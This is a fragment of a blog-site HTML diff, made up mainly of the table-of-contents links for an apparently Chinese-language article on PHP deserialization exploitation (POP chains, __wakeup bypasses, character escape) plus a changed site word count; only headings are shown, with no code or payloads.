nav-level-2"><a class="nav-link" href="#%E6%88%90%E5%91%98%E8%AE%BF%E9%97%AE%E7%9B%B8%E5%85%B3"><span class="nav-text">成员访问相关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#get"><span class="nav-text">__get()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#set"><span class="nav-text">__set()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#isset"><span class="nav-text">__isset()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unset"><span class="nav-text">__unset()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#call"><span class="nav-text">__call()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#callstatic"><span class="nav-text">__callStatic()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%E7%9B%B8%E5%85%B3"><span class="nav-text">回调函数相关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#call_user_funccall_user_func_array"><span class="nav-text">call_user_func、call_user_func_array</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%94%E7%94%A8"><span class="nav-text">应用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B5%B7%E7%82%B9"><span class="nav-text">起点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%AD%E9%97%B4%E8%B7%B3%E6%9D%BF"><span class="nav-text">中间跳板</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%88%E7%82%B9"><span class="nav-text">终点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-text">其他</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8"><span class="nav-text">反序列化基础利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pop-%E9%93%BE"><span class="nav-text">POP 链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%9F%E6%88%90%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE"><span class="nav-text">生成序列化数据</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B1%9E%E6%80%A7%E8%B5%8B%E5%80%BC"><span class="nav-text">属性赋值</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87"><span class="nav-text">PHP 反序列化绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#wakeup-%E7%BB%95%E8%BF%87"><span class="nav-text">__wakeup 绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#fast-destruct-%E7%BB%95%E8%BF%87"><span class="nav-text">Fast Destruct 绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cve-2016-7124"><span class="nav-text">CVE-2016-7124</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#custom-object-%E7%BB%95%E8%BF%87"><span class="nav-text">custom object 绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-text">过滤绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B1%BB%E5%B1%9E%E6%80%A7%E7%BB%95%E8%BF%87"><span class="nav-text">类属性绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E5%AD%97%E7%BB%95%E8%BF%87"><span class="nav-text">数字绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unicode-%E7%BB%95%E8%BF%87"><span class="nav-text">Unicode 绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87"><span class="nav-text">二次序列化绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E5%AF%B9%E8%B1%A1%E7%BB%95%E8%BF%87"><span class="nav-text">无对象绕过</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8"><span class="nav-text">反序列化字符逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%95%BF%E5%88%B0%E7%9F%AD%E6%9B%BF%E6%8D%A2"><span class="nav-text">长到短替换</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%AD%E5%88%B0%E9%95%BF%E7%9A%84%E6%9B%BF%E6%8D%A2"><span class="nav-text">短到长的替换</span></a></li></ol></li></ol>
 
     </div>
 </div>
@@ -1041,7 +1227,7 @@
                     </span>
                     
                         <span>
-                            376.4k words in total
+                            377.1k words in total
                         </span>
                     
                 </p>
